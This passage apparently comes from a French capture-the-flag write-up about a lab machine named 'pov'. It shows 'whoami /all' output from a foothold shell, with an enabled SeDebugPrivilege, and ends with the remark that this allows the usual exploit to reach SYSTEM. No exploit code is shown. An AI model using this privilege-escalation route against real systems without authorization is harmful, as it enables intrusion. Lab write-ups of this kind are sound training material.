PS C:\Windows\system32> whoami /all
whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
pov\alaading S-1-5-21-2506154456-4081221362-271687478-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes

==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE             Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288



PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Windows\system32>
```

Le privilège SeDebug est actif, ce qui nous permet d'utiliser l'exploit habituel pour passer SYSTEM :) !